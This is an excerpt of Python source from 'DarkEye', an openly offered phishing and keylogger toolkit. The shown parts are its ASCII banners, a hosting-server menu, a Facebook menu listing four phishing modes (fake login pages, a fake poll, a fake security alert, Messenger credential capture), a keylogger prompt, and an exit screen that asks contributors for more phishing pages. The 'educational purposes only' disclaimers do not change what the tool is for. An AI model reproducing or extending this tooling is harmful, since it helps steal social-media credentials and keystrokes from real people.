...
def selectServer(): #Question where user must select server
        ...
        ╔╦╗╔═╗╦═╗╦╔═   {0}╔═╗╦ ╦╔═╗{1}
         ║║╠═╣╠╦╝╠╩╗ ─ {0}║╣ ╚╦╝║╣ {1}
        ═╩╝╩ ╩╩╚═╩ ╩   {0}╚═╝ ╩ ╚═╝{1}
        {0}https://github.com/syed-roshan01
        {0}** BY:SYED       CREDITS:DARKSEC TEAM ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
        ...
        choice = input(" \n{0}DarkEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
        if choice == '1':
...
def runMainMenu(): #menu where user select what they wanna use
    ...
    for i in range(101):
        sleep(0.02)
        stdout.write("\r")
        stdout.write(_("{0}[{1}*{0}]{1} DarkEye is Opening. Please Wait...{2}%").format(MAIN0, MAIN4, i))
        stdout.flush()

    if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}y{1}/{2}n{1})\n{2}DarkEye >>> {0}").format(MAIN2, MAIN4, MAIN0)).upper() != 'Y': #Question where user must accept education purposes
        system('clear')
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''').format(MAIN3, MAIN4, MAIN2, MAIN0))
    ...
    option = input(_("{0}DarkEye >>>  {1}").format(MAIN0, MAIN2))
    if option == '1':
        loadModule('Facebook')
        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}DarkEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
...
def keyloggerprompt():
	...
	print (_('''{1}
        ...
        ╔╦╗╔═╗╦═╗╦╔═   {0}╔═╗╦ ╦╔═╗{1}
         ║║╠═╣╠╦╝╠╩╗ ─ {0}║╣ ╚╦╝║╣ {1}
        ═╩╝╩ ╩╩╚═╩ ╩   {0}╚═╝ ╩ ╚═╝{1}
        {1}https://github.com/syed-roshan01
        {0}** BY: {1}SYED       CREDITS:DARKSEC TEAM {0}**
''').format(MAIN0, MAIN2))
...
def endMessage(): #Message when DarkEye exit
        choice = input("\n\n{0}[{1}?{0}] Press '1' To Run Script Again {1}|{0} Press 'ENTER' To Exit\n{0} >> {2}".format(MAIN0, MAIN4, MAIN2))
        if choice == '1':
           system('sudo python3 DarkEye.py')
        elif choice == '':
            system('clear')
            print (_('''
                  {3}DARKEYE {3}BY: DARKSEC TEAM
            {1}https://github.com/syed-roshan01

  {3}  [[*]] IF YOU LIKE THIS TOOL, THEN PLEASE HELP US.
  {0}
     [{3}!{0}] PLEASE LET US KNOW , IF ANY PHISHING PAGE GOT BROKEN .
     [{3}!{0}] MAKE PULL REQUEST, LET US KNOW YOU SUPPORT US. https://github.com/DarkSecDevelopers
     [{3}!{0}] IF YOU HAVE MORE PHISHING PAGES, THEN JUST MAKE A PULL REQUEST. https://github.com/DarkSecDevelopers
     [{3}!{0}] PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
     [{3}!{0}] WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL
     [{3}!{0}] PLEASE SUPPORT THEM HERE THIS TOOL WAS MADE BY DARKSEC TEAM 
     [{3}!{0}] https://github.com/DarkSecDevelopers
